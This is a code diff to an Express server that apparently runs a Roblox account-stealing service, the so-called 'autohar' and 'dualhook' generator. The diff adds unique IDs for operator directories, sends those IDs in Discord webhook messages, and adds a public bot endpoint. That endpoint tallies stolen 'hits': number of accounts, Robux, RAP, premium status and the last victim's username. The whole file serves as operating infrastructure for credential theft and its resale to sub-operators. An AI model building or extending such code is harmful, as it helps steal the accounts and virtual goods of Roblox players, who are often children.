@@ -201,6 +201,22 @@ app.post('/api/create-directory', async (req, res) => {
       return res.status(409).json({ error: 'Directory already exists' });
     }
 
+    // Generate unique 6-8 digit ID
+    const generateUniqueId = () => {
+      return Math.floor(100000 + Math.random() * 99900000).toString();
+    };
+    
+    let uniqueId;
+    do {
+      uniqueId = generateUniqueId();
+      // Check if ID already exists in any directory or subdirectory
+      const idExists = Object.values(directories).some(dir => 
+        dir.uniqueId === uniqueId || 
+        (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
+      );
+      if (!idExists) break;
+    } while (true);
+
     // Create new directory entry
     const authToken = crypto.randomBytes(32).toString('hex');
     directories[directoryName] = {
@@ -210,6 +226,7 @@ app.post('/api/create-directory', async (req, res) => {
       created: new Date().toISOString(),
       apiToken: crypto.randomBytes(32).toString('hex'),
       authToken: authToken, // For user dashboard login
+      uniqueId: uniqueId, // Unique ID for stats
       subdirectories: {} // For nested directories in dualhook
     };
 
@@ -226,8 +243,8 @@ app.post('/api/create-directory', async (req, res) => {
         ? `${directoryName.toUpperCase()} GENERATOR` 
         : 'LUNIX AUTOHAR';
       const description = serviceType === 'dualhook' 
-        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
-        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;
+        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``
+        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${authToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[directoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``;
 
       const notificationPayload = {
         embeds: [{
@@ -259,7 +276,8 @@ app.post('/api/create-directory', async (req, res) => {
       success: true, 
       directoryName: directoryName,
       apiToken: directories[directoryName].apiToken,
-      authToken: authToken
+      authToken: authToken,
+      uniqueId: directories[directoryName].uniqueId
     });
 
   } catch (error) {
@@ -514,6 +532,120 @@ app.get('/api/live-hits', async (req, res) => {
 
   } catch (error) {
     console.error('Error getting live hits:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Public API endpoint for bots to get directory stats by unique ID
+app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
+  try {
+    const uniqueId = req.params.uniqueId;
+    
+    // Load directories to find the one with this unique ID
+    const directories = await loadDirectories();
+    
+    let targetDirectory = null;
+    let targetDirectoryName = null;
+    let isSubdirectory = false;
+    
+    // Search through all directories and subdirectories for the unique ID
+    for (const [dirName, dirConfig] of Object.entries(directories)) {
+      if (dirConfig.uniqueId === uniqueId) {
+        targetDirectory = dirName;
+        targetDirectoryName = dirName;
+        break;
+      }
+      
+      // Check subdirectories
+      if (dirConfig.subdirectories) {
+        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
+          if (subConfig.uniqueId === uniqueId) {
+            targetDirectory = `${dirName}/${subName}`;
+            targetDirectoryName = subName;
+            isSubdirectory = true;
+            break;
+          }
+        }
+      }
+      
+      if (targetDirectory) break;
+    }
+    
+    if (!targetDirectory) {
+      return res.status(404).json({ 
+        error: 'Directory not found',
+        uniqueId: uniqueId
+      });
+    }
+
+    // Get user logs from Firebase
+    const logsRef = db.ref('user_logs');
+    const snapshot = await logsRef.once('value');
+    const allLogs = snapshot.val() || {};
+    
+    // Filter logs for this specific directory
+    const directoryLogs = Object.values(allLogs).filter(log => {
+      if (!log.context) return false;
+      
+      // For direct directory matches
+      if (log.context.directory === targetDirectory) return true;
+      
+      // For subdirectory matches
+      if (log.context.subdirectory && 
+          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
+        return true;
+      }
+      
+      return false;
+    });
+
+    const today = new Date().toDateString();
+    const todayLogs = directoryLogs.filter(log => {
+      const logDate = new Date(log.timestamp).toDateString();
+      return logDate === today;
+    });
+
+    // Calculate statistics
+    const totalAccounts = directoryLogs.length;
+    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
+    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
+    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
+    
+    const todayAccounts = todayLogs.length;
+    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
+    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
+    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);
+
+    // Get last hit info
+    const lastHit = directoryLogs.length > 0 
+      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
+      : null;
+
+    res.json({
+      uniqueId: uniqueId,
+      directory: targetDirectoryName,
+      fullPath: targetDirectory,
+      isSubdirectory: isSubdirectory,
+      stats: {
+        totalAccounts,
+        totalSummary,
+        totalRobux,
+        totalRAP,
+        todayAccounts,
+        todaySummary,
+        todayRobux,
+        todayRAP
+      },
+      lastHit: lastHit ? {
+        username: lastHit.userData.username || 'Unknown',
+        timestamp: lastHit.timestamp,
+        robux: lastHit.userData.robux || 0,
+        premium: lastHit.userData.premium || false
+      } : null
+    });
+
+  } catch (error) {
+    console.error('Error getting bot stats by ID:', error);
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -1538,13 +1670,30 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
       return res.status(409).json({ error: 'Subdirectory already exists' });
     }
 
+    // Generate unique ID for subdirectory
+    const generateUniqueId = () => {
+      return Math.floor(100000 + Math.random() * 99900000).toString();
+    };
+    
+    let uniqueId;
+    do {
+      uniqueId = generateUniqueId();
+      // Check if ID already exists in any directory or subdirectory
+      const idExists = Object.values(directories).some(dir => 
+        dir.uniqueId === uniqueId || 
+        (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
+      );
+      if (!idExists) break;
+    } while (true);
+
     // Create subdirectory
     const subAuthToken = crypto.randomBytes(32).toString('hex');
     directories[parentDirectory].subdirectories[subdirectoryName] = {
       webhookUrl: webhookUrl,
       created: new Date().toISOString(),
       apiToken: crypto.randomBytes(32).toString('hex'),
-      authToken: subAuthToken
+      authToken: subAuthToken,
+      uniqueId: uniqueId // Unique ID for stats
     };
 
     // Save directories
@@ -1559,7 +1708,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
       const creationNotificationPayload = {
         embeds: [{
           title: `${parentDirectory.toUpperCase()} AUTOHAR`,
-          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${subAuthToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``,
+          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${subAuthToken}\`\n\n🆔 **Your Unique ID:**\n\`${directories[parentDirectory].subdirectories[subdirectoryName].uniqueId}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``,
           color: 0x8B5CF6,
           footer: {
             text: `Made by ${parentDirectory}`
@@ -1584,7 +1733,8 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
       parentDirectory: parentDirectory,
       subdirectoryName: subdirectoryName,
       apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken,
-      authToken: subAuthToken
+      authToken: subAuthToken,
+      uniqueId: directories[parentDirectory].subdirectories[subdirectoryName].uniqueId
     });
 
   } catch (error) {
